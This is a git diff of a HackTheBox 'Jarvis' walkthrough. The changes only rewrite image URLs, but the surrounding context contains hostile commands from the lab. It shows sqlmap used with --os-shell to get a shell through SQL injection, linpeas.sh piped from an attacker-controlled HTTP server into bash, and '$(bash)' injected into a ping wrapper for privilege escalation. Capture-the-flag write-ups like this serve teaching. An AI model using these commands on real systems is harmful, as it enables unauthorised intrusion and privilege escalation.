@@ -63,7 +63,7 @@ We can try to get a shell using `sqlmap` by using the `--os-shell` option:
 ```
 sqlmap -u http://10.10.10.143/room.php?cod=1 --os-shell --random-agent
 ```
-![](/images/hackthebox/jarvis/www-data-shell.png)
+![](https://res.cloudinary.com/dytfhf4l8/image/upload/blog/hackthebox/jarvis/www-data-shell.png)
 
 And it does work! We have a shell as `www-data` user.
 
@@ -88,7 +88,7 @@ http://10.10.14.8:8080/linpeas.sh | bash`.
 
 There seems to be an interesting command that we can run as the user `pepper`
 without providing it's password:
-![](/images/hackthebox/jarvis/simpler.png)
+![](https://res.cloudinary.com/dytfhf4l8/image/upload/blog/hackthebox/jarvis/simpler.png)
 
 Here's the code of `simpler.py` (I removed the useless parts):
 ```python
@@ -129,7 +129,7 @@ It's a wrapper to the `ping` command, and it basically pings any host that we
 provide as input. There are some characters that we can not use as input, but
 luckily we can use `$`, `(` and `)`.  
 We can easily get a shell by using `$(bash)` as the ip to connect to:
-![](/images/hackthebox/jarvis/user-shell.png)
+![](https://res.cloudinary.com/dytfhf4l8/image/upload/blog/hackthebox/jarvis/user-shell.png)
 
 And then let's get the flag:
 ```
